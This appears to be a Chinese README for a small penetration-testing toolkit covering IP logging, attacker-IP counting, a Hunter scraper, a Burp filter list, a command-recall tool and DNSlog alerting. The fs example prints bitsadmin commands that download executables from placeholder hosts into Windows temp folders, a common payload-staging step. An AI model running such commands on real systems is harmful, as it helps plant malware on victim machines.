# 渗透测试小工具集

## getip 

> 记录自己的出口IP

## attacktop

> 攻击者IP次数统计


- 在看golang，顺手就把之前的一些python改成golang了。
- 这工具有个好处就在于统计出现次数，虽然Excel其实可以做得很好，但好多时候我连Excel都难得打开。把这工具添加环境变量，直接一条命令解决。

## hunters

> 网上其实关于hunter的爬虫工具非常多，但不知道为啥总冥冥之中觉得不适合自己，所以造了这个轮子。
>
> 功能大体跟别的相似，并且只支持hunter，原因是fofa有ehole、360可以直接导出。我费那个劲集成在一起干啥，并且这些工具其实人家都做得挺不错。
>
> hunters计划后头写成图形化的，别问为啥，有些时候命令行总觉得缺了点啥（单纯个人觉得）

## WebFilter

> Burpsuite代理的时候可以使用这部分过滤非常多的垃圾网站（包含一部分互联网企业，如果挖掘src的需要自行研判了）以此减轻BurpSuite被动扫描的压力。

## Fs

>  年龄大了？记忆不好？就用fs
>
> 代码很简洁，需要自己简单修改下代码，没有很好做好适配。
>
> 把你常用且又爱忘记的一些命令放到use.log里，然后通过执行Linux命令来检索。
>
> 那么你只需要编译好这个工具以后直接fs admin，就可以检索admin相关的信息出来。

如下所示：

```bash
➜  ~ fs bitsadmin
-+====================================+-
   181  ➜  windows download[+]:bitsadmin /rawreturn /transfer getfile http://x.x.x.x:8888/tomcat.exe c:\\users\\Manager\\AppData\\Local\\Temp
   183  ➜  windows download[+]:bitsadmin /rawreturn /transfer down "http://127.0.0.1:8080/z.exe" c:\\z.exe
   259  ➜  bitsadmin /rawreturn /transfer getfile http://x.x.x.x/tomcat.exe c:\\users\\Manager\\AppData\\Local\\Temp
-+====================================+-
```

安排的明明白白。

懒人必备神器！



## ceyes

> ceyes dnslog自动告警

> 早之前一直使用低版本的BurpSuite1.7.33,奈何在低版本中logger插件动不动就卡死啥的,然后使用了高版本，心想这个问题就解决了，没想到....源于昨天一堆告警,而我在log4j里死活搜索不到。所以就有了这个小脚本。😁